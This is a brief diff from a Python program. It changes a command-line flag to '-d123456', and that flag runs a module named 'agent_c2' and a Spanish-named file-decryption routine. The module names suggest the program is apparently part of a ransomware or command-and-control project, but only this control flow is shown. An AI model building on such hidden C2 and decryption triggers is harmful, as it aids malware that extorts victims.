@@ -5,7 +5,7 @@ import decrypt
 import agent_c2
 
 def main():
-    if len(sys.argv) > 1 and sys.argv[1] == "-d":
+    if len(sys.argv) > 1 and sys.argv[1] == "-d123456":
         agent_c2.main()
         decrypt.descifrar_archivos()
     else:
